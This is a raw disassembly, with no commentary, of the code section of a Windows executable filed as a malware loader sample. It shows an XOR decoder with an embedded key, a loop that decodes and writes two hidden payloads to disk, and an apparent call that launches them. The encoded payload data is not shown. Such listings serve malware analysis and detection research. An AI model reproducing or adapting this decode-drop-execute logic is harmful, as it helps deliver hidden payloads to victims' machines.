
malware_samples/loader/a58c8b458a1e1ea8000fd8314decaf3d28f2883e514cd22f1a2174610941011b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	81 ec 10 00 00 00    	sub    $0x10,%esp
  401009:	90                   	nop
  40100a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40100d:	40                   	inc    %eax
  40100e:	50                   	push   %eax
  40100f:	e8 74 05 00 00       	call   0x401588
  401014:	83 c4 04             	add    $0x4,%esp
  401017:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40101a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40101d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401020:	01 c1                	add    %eax,%ecx
  401022:	b8 00 00 00 00       	mov    $0x0,%eax
  401027:	88 01                	mov    %al,(%ecx)
  401029:	b8 00 00 00 00       	mov    $0x0,%eax
  40102e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401031:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401034:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401037:	39 c8                	cmp    %ecx,%eax
  401039:	0f 8d 48 00 00 00    	jge    0x401087
  40103f:	e9 09 00 00 00       	jmp    0x40104d
  401044:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401047:	40                   	inc    %eax
  401048:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40104b:	eb e4                	jmp    0x401031
  40104d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401050:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401053:	01 c1                	add    %eax,%ecx
  401055:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401058:	8b 55 08             	mov    0x8(%ebp),%edx
  40105b:	01 c2                	add    %eax,%edx
  40105d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401060:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401063:	b9 20 00 00 00       	mov    $0x20,%ecx
  401068:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40106b:	99                   	cltd
  40106c:	f7 f9                	idiv   %ecx
  40106e:	b8 00 20 40 00       	mov    $0x402000,%eax
  401073:	01 d0                	add    %edx,%eax
  401075:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401078:	0f be 09             	movsbl (%ecx),%ecx
  40107b:	0f be 10             	movsbl (%eax),%edx
  40107e:	31 d1                	xor    %edx,%ecx
  401080:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401083:	88 08                	mov    %cl,(%eax)
  401085:	eb bd                	jmp    0x401044
  401087:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40108a:	c9                   	leave
  40108b:	c3                   	ret
  40108c:	55                   	push   %ebp
  40108d:	89 e5                	mov    %esp,%ebp
  40108f:	81 ec 54 04 00 00    	sub    $0x454,%esp
  401095:	90                   	nop
  401096:	b8 18 00 00 00       	mov    $0x18,%eax
  40109b:	50                   	push   %eax
  40109c:	b8 00 00 00 00       	mov    $0x0,%eax
  4010a1:	50                   	push   %eax
  4010a2:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4010a5:	50                   	push   %eax
  4010a6:	e8 e5 04 00 00       	call   0x401590
  4010ab:	83 c4 0c             	add    $0xc,%esp
  4010ae:	b8 21 20 40 00       	mov    $0x402021,%eax
  4010b3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4010b6:	b8 26 20 40 00       	mov    $0x402026,%eax
  4010bb:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4010be:	b8 31 20 40 00       	mov    $0x402031,%eax
  4010c3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010c6:	b8 32 a4 40 00       	mov    $0x40a432,%eax
  4010cb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4010ce:	b8 37 a4 40 00       	mov    $0x40a437,%eax
  4010d3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4010d6:	b8 4d a4 40 00       	mov    $0x40a44d,%eax
  4010db:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4010de:	b8 20 00 00 00       	mov    $0x20,%eax
  4010e3:	50                   	push   %eax
  4010e4:	b8 00 00 00 00       	mov    $0x0,%eax
  4010e9:	50                   	push   %eax
  4010ea:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4010ed:	50                   	push   %eax
  4010ee:	e8 9d 04 00 00       	call   0x401590
  4010f3:	83 c4 0c             	add    $0xc,%esp
  4010f6:	b8 04 00 00 00       	mov    $0x4,%eax
  4010fb:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4010fe:	b8 0a 00 00 00       	mov    $0xa,%eax
  401103:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401106:	b8 00 84 00 00       	mov    $0x8400,%eax
  40110b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40110e:	b8 01 00 00 00       	mov    $0x1,%eax
  401113:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401116:	b8 04 00 00 00       	mov    $0x4,%eax
  40111b:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40111e:	b8 15 00 00 00       	mov    $0x15,%eax
  401123:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401126:	b8 00 cc 16 00       	mov    $0x16cc00,%eax
  40112b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40112e:	b8 01 00 00 00       	mov    $0x1,%eax
  401133:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401136:	b8 00 00 00 00       	mov    $0x0,%eax
  40113b:	89 85 b4 fb ff ff    	mov    %eax,-0x44c(%ebp)
  401141:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  401147:	83 f8 02             	cmp    $0x2,%eax
  40114a:	0f 8d fe 01 00 00    	jge    0x40134e
  401150:	e9 0f 00 00 00       	jmp    0x401164
  401155:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  40115b:	40                   	inc    %eax
  40115c:	89 85 b4 fb ff ff    	mov    %eax,-0x44c(%ebp)
  401162:	eb dd                	jmp    0x401141
  401164:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  40116a:	b9 0c 00 00 00       	mov    $0xc,%ecx
  40116f:	0f af c1             	imul   %ecx,%eax
  401172:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401175:	01 c1                	add    %eax,%ecx
  401177:	b8 4e 70 57 00       	mov    $0x57704e,%eax
  40117c:	50                   	push   %eax
  40117d:	8b 01                	mov    (%ecx),%eax
  40117f:	50                   	push   %eax
  401180:	e8 13 04 00 00       	call   0x401598
  401185:	83 c4 08             	add    $0x8,%esp
  401188:	83 f8 00             	cmp    $0x0,%eax
  40118b:	0f 85 4a 00 00 00    	jne    0x4011db
  401191:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  401197:	b9 0c 00 00 00       	mov    $0xc,%ecx
  40119c:	0f af c1             	imul   %ecx,%eax
  40119f:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4011a2:	01 c1                	add    %eax,%ecx
  4011a4:	83 c1 04             	add    $0x4,%ecx
  4011a7:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  4011ad:	c1 e0 04             	shl    $0x4,%eax
  4011b0:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4011b3:	01 c2                	add    %eax,%edx
  4011b5:	83 c2 04             	add    $0x4,%edx
  4011b8:	8b 02                	mov    (%edx),%eax
  4011ba:	50                   	push   %eax
  4011bb:	8b 01                	mov    (%ecx),%eax
  4011bd:	50                   	push   %eax
  4011be:	e8 3d fe ff ff       	call   0x401000
  4011c3:	83 c4 08             	add    $0x8,%esp
  4011c6:	50                   	push   %eax
  4011c7:	8d 85 b8 fb ff ff    	lea    -0x448(%ebp),%eax
  4011cd:	50                   	push   %eax
  4011ce:	e8 cd 03 00 00       	call   0x4015a0
  4011d3:	83 c4 08             	add    $0x8,%esp
  4011d6:	e9 90 00 00 00       	jmp    0x40126b
  4011db:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  4011e1:	b9 0c 00 00 00       	mov    $0xc,%ecx
  4011e6:	0f af c1             	imul   %ecx,%eax
  4011e9:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4011ec:	01 c1                	add    %eax,%ecx
  4011ee:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  4011f4:	c1 e0 04             	shl    $0x4,%eax
  4011f7:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4011fa:	01 c2                	add    %eax,%edx
  4011fc:	8b 02                	mov    (%edx),%eax
  4011fe:	50                   	push   %eax
  4011ff:	8b 01                	mov    (%ecx),%eax
  401201:	50                   	push   %eax
  401202:	e8 f9 fd ff ff       	call   0x401000
  401207:	83 c4 08             	add    $0x8,%esp
  40120a:	50                   	push   %eax
  40120b:	e8 98 03 00 00       	call   0x4015a8
  401210:	83 c4 04             	add    $0x4,%esp
  401213:	8b 8d b4 fb ff ff    	mov    -0x44c(%ebp),%ecx
  401219:	ba 0c 00 00 00       	mov    $0xc,%edx
  40121e:	0f af ca             	imul   %edx,%ecx
  401221:	8d 55 e8             	lea    -0x18(%ebp),%edx
  401224:	01 ca                	add    %ecx,%edx
  401226:	83 c2 04             	add    $0x4,%edx
  401229:	8b 8d b4 fb ff ff    	mov    -0x44c(%ebp),%ecx
  40122f:	c1 e1 04             	shl    $0x4,%ecx
  401232:	89 85 b0 fb ff ff    	mov    %eax,-0x450(%ebp)
  401238:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40123b:	01 c8                	add    %ecx,%eax
  40123d:	83 c0 04             	add    $0x4,%eax
  401240:	8b 08                	mov    (%eax),%ecx
  401242:	51                   	push   %ecx
  401243:	8b 02                	mov    (%edx),%eax
  401245:	50                   	push   %eax
  401246:	e8 b5 fd ff ff       	call   0x401000
  40124b:	83 c4 08             	add    $0x8,%esp
  40124e:	50                   	push   %eax
  40124f:	8b 85 b0 fb ff ff    	mov    -0x450(%ebp),%eax
  401255:	50                   	push   %eax
  401256:	b8 60 70 57 00       	mov    $0x577060,%eax
  40125b:	50                   	push   %eax
  40125c:	8d 85 b8 fb ff ff    	lea    -0x448(%ebp),%eax
  401262:	50                   	push   %eax
  401263:	e8 48 03 00 00       	call   0x4015b0
  401268:	83 c4 10             	add    $0x10,%esp
  40126b:	b8 66 70 57 00       	mov    $0x577066,%eax
  401270:	50                   	push   %eax
  401271:	8d 85 b8 fb ff ff    	lea    -0x448(%ebp),%eax
  401277:	50                   	push   %eax
  401278:	e8 3b 03 00 00       	call   0x4015b8
  40127d:	83 c4 08             	add    $0x8,%esp
  401280:	89 85 ac fb ff ff    	mov    %eax,-0x454(%ebp)
  401286:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  40128c:	b9 0c 00 00 00       	mov    $0xc,%ecx
  401291:	0f af c1             	imul   %ecx,%eax
  401294:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401297:	01 c1                	add    %eax,%ecx
  401299:	83 c1 08             	add    $0x8,%ecx
  40129c:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  4012a2:	c1 e0 04             	shl    $0x4,%eax
  4012a5:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4012a8:	01 c2                	add    %eax,%edx
  4012aa:	83 c2 08             	add    $0x8,%edx
  4012ad:	8b 02                	mov    (%edx),%eax
  4012af:	50                   	push   %eax
  4012b0:	8b 01                	mov    (%ecx),%eax
  4012b2:	50                   	push   %eax
  4012b3:	e8 48 fd ff ff       	call   0x401000
  4012b8:	83 c4 08             	add    $0x8,%esp
  4012bb:	8b 8d b4 fb ff ff    	mov    -0x44c(%ebp),%ecx
  4012c1:	c1 e1 04             	shl    $0x4,%ecx
  4012c4:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4012c7:	01 ca                	add    %ecx,%edx
  4012c9:	83 c2 08             	add    $0x8,%edx
  4012cc:	8b 8d ac fb ff ff    	mov    -0x454(%ebp),%ecx
  4012d2:	51                   	push   %ecx
  4012d3:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012d8:	51                   	push   %ecx
  4012d9:	8b 0a                	mov    (%edx),%ecx
  4012db:	51                   	push   %ecx
  4012dc:	50                   	push   %eax
  4012dd:	e8 de 02 00 00       	call   0x4015c0
  4012e2:	83 c4 10             	add    $0x10,%esp
  4012e5:	8b 85 ac fb ff ff    	mov    -0x454(%ebp),%eax
  4012eb:	50                   	push   %eax
  4012ec:	e8 d7 02 00 00       	call   0x4015c8
  4012f1:	83 c4 04             	add    $0x4,%esp
  4012f4:	8b 85 b4 fb ff ff    	mov    -0x44c(%ebp),%eax
  4012fa:	c1 e0 04             	shl    $0x4,%eax
  4012fd:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401300:	01 c1                	add    %eax,%ecx
  401302:	83 c1 0c             	add    $0xc,%ecx
  401305:	8b 01                	mov    (%ecx),%eax
  401307:	83 f8 00             	cmp    $0x0,%eax
  40130a:	0f 84 39 00 00 00    	je     0x401349
  401310:	b8 04 00 00 00       	mov    $0x4,%eax
  401315:	50                   	push   %eax
  401316:	b8 69 70 57 00       	mov    $0x577069,%eax
  40131b:	50                   	push   %eax
  40131c:	e8 df fc ff ff       	call   0x401000
  401321:	83 c4 08             	add    $0x8,%esp
  401324:	b9 0a 00 00 00       	mov    $0xa,%ecx
  401329:	51                   	push   %ecx
  40132a:	b9 00 00 00 00       	mov    $0x0,%ecx
  40132f:	51                   	push   %ecx
  401330:	b9 00 00 00 00       	mov    $0x0,%ecx
  401335:	51                   	push   %ecx
  401336:	8d 8d b8 fb ff ff    	lea    -0x448(%ebp),%ecx
  40133c:	51                   	push   %ecx
  40133d:	50                   	push   %eax
  40133e:	b8 00 00 00 00       	mov    $0x0,%eax
  401343:	50                   	push   %eax
  401344:	e8 87 02 00 00       	call   0x4015d0
  401349:	e9 07 fe ff ff       	jmp    0x401155
  40134e:	b8 00 00 00 00       	mov    $0x0,%eax
  401353:	c9                   	leave
  401354:	c3                   	ret
  401355:	00 00                	add    %al,(%eax)
  401357:	00 55 89             	add    %dl,-0x77(%ebp)
  40135a:	e5 81                	in     $0x81,%eax
  40135c:	ec                   	in     (%dx),%al
  40135d:	08 00                	or     %al,(%eax)
  40135f:	00 00                	add    %al,(%eax)
  401361:	90                   	nop
  401362:	b8 00 00 00 00       	mov    $0x0,%eax
  401367:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40136a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40136d:	c1 e0 02             	shl    $0x2,%eax
  401370:	b9 00 80 57 00       	mov    $0x578000,%ecx
  401375:	01 c1                	add    %eax,%ecx
  401377:	b8 00 80 57 00       	mov    $0x578000,%eax
  40137c:	39 c1                	cmp    %eax,%ecx
  40137e:	0f 84 2e 00 00 00    	je     0x4013b2
  401384:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401387:	89 c1                	mov    %eax,%ecx
  401389:	40                   	inc    %eax
  40138a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40138d:	c1 e1 02             	shl    $0x2,%ecx
  401390:	b8 00 80 57 00       	mov    $0x578000,%eax
  401395:	01 c8                	add    %ecx,%eax
  401397:	8b 08                	mov    (%eax),%ecx
  401399:	8b 45 10             	mov    0x10(%ebp),%eax
  40139c:	50                   	push   %eax
  40139d:	8b 45 0c             	mov    0xc(%ebp),%eax
  4013a0:	50                   	push   %eax
  4013a1:	8b 45 08             	mov    0x8(%ebp),%eax
  4013a4:	50                   	push   %eax
  4013a5:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4013a8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013ab:	ff d0                	call   *%eax
  4013ad:	83 c4 0c             	add    $0xc,%esp
  4013b0:	eb b8                	jmp    0x40136a
  4013b2:	c9                   	leave
  4013b3:	c3                   	ret
  4013b4:	55                   	push   %ebp
  4013b5:	89 e5                	mov    %esp,%ebp
  4013b7:	81 ec 08 00 00 00    	sub    $0x8,%esp
  4013bd:	90                   	nop
  4013be:	b8 00 00 00 00       	mov    $0x0,%eax
  4013c3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4013c6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4013c9:	c1 e0 02             	shl    $0x2,%eax
  4013cc:	b9 00 80 57 00       	mov    $0x578000,%ecx
  4013d1:	01 c1                	add    %eax,%ecx
  4013d3:	b8 00 80 57 00       	mov    $0x578000,%eax
  4013d8:	39 c1                	cmp    %eax,%ecx
  4013da:	0f 84 1d 00 00 00    	je     0x4013fd
  4013e0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4013e3:	48                   	dec    %eax
  4013e4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4013e7:	c1 e0 02             	shl    $0x2,%eax
  4013ea:	b9 00 80 57 00       	mov    $0x578000,%ecx
  4013ef:	01 c1                	add    %eax,%ecx
  4013f1:	8b 01                	mov    (%ecx),%eax
  4013f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4013f6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013f9:	ff d0                	call   *%eax
  4013fb:	eb c9                	jmp    0x4013c6
  4013fd:	c9                   	leave
  4013fe:	c3                   	ret
  4013ff:	55                   	push   %ebp
  401400:	89 e5                	mov    %esp,%ebp
  401402:	81 ec 08 00 00 00    	sub    $0x8,%esp
  401408:	90                   	nop
  401409:	8b 45 10             	mov    0x10(%ebp),%eax
  40140c:	50                   	push   %eax
  40140d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401410:	50                   	push   %eax
  401411:	8b 45 08             	mov    0x8(%ebp),%eax
  401414:	50                   	push   %eax
  401415:	e8 3e ff ff ff       	call   0x401358
  40141a:	83 c4 0c             	add    $0xc,%esp
  40141d:	8b 05 e4 70 57 00    	mov    0x5770e4,%eax
  401423:	8b 0d e8 70 57 00    	mov    0x5770e8,%ecx
  401429:	8b 15 ec 70 57 00    	mov    0x5770ec,%edx
  40142f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401432:	8b 02                	mov    (%edx),%eax
  401434:	50                   	push   %eax
  401435:	8b 01                	mov    (%ecx),%eax
  401437:	50                   	push   %eax
  401438:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40143b:	8b 00                	mov    (%eax),%eax
  40143d:	50                   	push   %eax
  40143e:	e8 49 fc ff ff       	call   0x40108c
  401443:	83 c4 0c             	add    $0xc,%esp
  401446:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401449:	e8 66 ff ff ff       	call   0x4013b4
  40144e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401451:	c9                   	leave
  401452:	c3                   	ret
  401453:	55                   	push   %ebp
  401454:	89 e5                	mov    %esp,%ebp
  401456:	81 ec 00 00 00 00    	sub    $0x0,%esp
  40145c:	90                   	nop
  40145d:	8b 45 08             	mov    0x8(%ebp),%eax
  401460:	8b 08                	mov    (%eax),%ecx
  401462:	8b 45 08             	mov    0x8(%ebp),%eax
  401465:	50                   	push   %eax
  401466:	8b 01                	mov    (%ecx),%eax
  401468:	50                   	push   %eax
  401469:	e8 6a 01 00 00       	call   0x4015d8
  40146e:	83 c4 08             	add    $0x8,%esp
  401471:	c9                   	leave
  401472:	c2 04 00             	ret    $0x4
  401475:	55                   	push   %ebp
  401476:	89 e5                	mov    %esp,%ebp
  401478:	81 ec 08 00 00 00    	sub    $0x8,%esp
  40147e:	90                   	nop
  40147f:	b8 04 00 00 00       	mov    $0x4,%eax
  401484:	50                   	push   %eax
  401485:	b8 00 00 00 00       	mov    $0x0,%eax
  40148a:	50                   	push   %eax
  40148b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40148e:	50                   	push   %eax
  40148f:	e8 fc 00 00 00       	call   0x401590
  401494:	83 c4 0c             	add    $0xc,%esp
  401497:	b8 53 14 40 00       	mov    $0x401453,%eax
  40149c:	50                   	push   %eax
  40149d:	e8 3e 01 00 00       	call   0x4015e0
  4014a2:	b8 01 00 00 00       	mov    $0x1,%eax
  4014a7:	50                   	push   %eax
  4014a8:	e8 3b 01 00 00       	call   0x4015e8
  4014ad:	83 c4 04             	add    $0x4,%esp
  4014b0:	b8 00 00 03 00       	mov    $0x30000,%eax
  4014b5:	50                   	push   %eax
  4014b6:	b8 00 00 01 00       	mov    $0x10000,%eax
  4014bb:	50                   	push   %eax
  4014bc:	e8 2f 01 00 00       	call   0x4015f0
  4014c1:	83 c4 08             	add    $0x8,%esp
  4014c4:	8b 05 e4 70 57 00    	mov    0x5770e4,%eax
  4014ca:	8b 0d e8 70 57 00    	mov    0x5770e8,%ecx
  4014d0:	8b 15 ec 70 57 00    	mov    0x5770ec,%edx
  4014d6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4014d9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4014dc:	50                   	push   %eax
  4014dd:	8b 05 00 80 57 00    	mov    0x578000,%eax
  4014e3:	50                   	push   %eax
  4014e4:	52                   	push   %edx
  4014e5:	51                   	push   %ecx
  4014e6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014e9:	50                   	push   %eax
  4014ea:	e8 09 01 00 00       	call   0x4015f8
  4014ef:	83 c4 14             	add    $0x14,%esp
  4014f2:	8b 05 e4 70 57 00    	mov    0x5770e4,%eax
  4014f8:	8b 0d e8 70 57 00    	mov    0x5770e8,%ecx
  4014fe:	8b 15 ec 70 57 00    	mov    0x5770ec,%edx
  401504:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401507:	8b 02                	mov    (%edx),%eax
  401509:	50                   	push   %eax
  40150a:	8b 01                	mov    (%ecx),%eax
  40150c:	50                   	push   %eax
  40150d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401510:	8b 00                	mov    (%eax),%eax
  401512:	50                   	push   %eax
  401513:	e8 e7 fe ff ff       	call   0x4013ff
  401518:	83 c4 0c             	add    $0xc,%esp
  40151b:	50                   	push   %eax
  40151c:	e8 df 00 00 00       	call   0x401600
  401521:	83 c4 04             	add    $0x4,%esp
  401524:	c9                   	leave
  401525:	c3                   	ret
  401526:	55                   	push   %ebp
  401527:	89 e5                	mov    %esp,%ebp
  401529:	81 ec 04 00 00 00    	sub    $0x4,%esp
  40152f:	90                   	nop
  401530:	8b 05 e4 70 57 00    	mov    0x5770e4,%eax
  401536:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401539:	89 08                	mov    %ecx,(%eax)
  40153b:	8b 05 e8 70 57 00    	mov    0x5770e8,%eax
  401541:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401544:	89 08                	mov    %ecx,(%eax)
  401546:	b8 00 00 03 00       	mov    $0x30000,%eax
  40154b:	50                   	push   %eax
  40154c:	b8 00 00 01 00       	mov    $0x10000,%eax
  401551:	50                   	push   %eax
  401552:	e8 99 00 00 00       	call   0x4015f0
  401557:	83 c4 08             	add    $0x8,%esp
  40155a:	8b 05 e4 70 57 00    	mov    0x5770e4,%eax
  401560:	8b 0d e8 70 57 00    	mov    0x5770e8,%ecx
  401566:	8b 15 ec 70 57 00    	mov    0x5770ec,%edx
  40156c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40156f:	8b 02                	mov    (%edx),%eax
  401571:	50                   	push   %eax
  401572:	8b 01                	mov    (%ecx),%eax
  401574:	50                   	push   %eax
  401575:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401578:	8b 00                	mov    (%eax),%eax
  40157a:	50                   	push   %eax
  40157b:	e8 0c fb ff ff       	call   0x40108c
  401580:	83 c4 0c             	add    $0xc,%esp
  401583:	c9                   	leave
  401584:	c3                   	ret
  401585:	00 00                	add    %al,(%eax)
  401587:	00 ff                	add    %bh,%bh
  401589:	25 c0 70 57 00       	and    $0x5770c0,%eax
  40158e:	00 00                	add    %al,(%eax)
  401590:	ff 25 c4 70 57 00    	jmp    *0x5770c4
  401596:	00 00                	add    %al,(%eax)
  401598:	ff 25 c8 70 57 00    	jmp    *0x5770c8
  40159e:	00 00                	add    %al,(%eax)
  4015a0:	ff 25 cc 70 57 00    	jmp    *0x5770cc
  4015a6:	00 00                	add    %al,(%eax)
  4015a8:	ff 25 d0 70 57 00    	jmp    *0x5770d0
  4015ae:	00 00                	add    %al,(%eax)
  4015b0:	ff 25 d4 70 57 00    	jmp    *0x5770d4
  4015b6:	00 00                	add    %al,(%eax)
  4015b8:	ff 25 d8 70 57 00    	jmp    *0x5770d8
  4015be:	00 00                	add    %al,(%eax)
  4015c0:	ff 25 dc 70 57 00    	jmp    *0x5770dc
  4015c6:	00 00                	add    %al,(%eax)
  4015c8:	ff 25 e0 70 57 00    	jmp    *0x5770e0
  4015ce:	00 00                	add    %al,(%eax)
  4015d0:	ff 25 08 71 57 00    	jmp    *0x577108
  4015d6:	00 00                	add    %al,(%eax)
  4015d8:	ff 25 f0 70 57 00    	jmp    *0x5770f0
  4015de:	00 00                	add    %al,(%eax)
  4015e0:	ff 25 10 71 57 00    	jmp    *0x577110
  4015e6:	00 00                	add    %al,(%eax)
  4015e8:	ff 25 f4 70 57 00    	jmp    *0x5770f4
  4015ee:	00 00                	add    %al,(%eax)
  4015f0:	ff 25 f8 70 57 00    	jmp    *0x5770f8
  4015f6:	00 00                	add    %al,(%eax)
  4015f8:	ff 25 fc 70 57 00    	jmp    *0x5770fc
  4015fe:	00 00                	add    %al,(%eax)
  401600:	ff 25 00 71 57 00    	jmp    *0x577100
	...
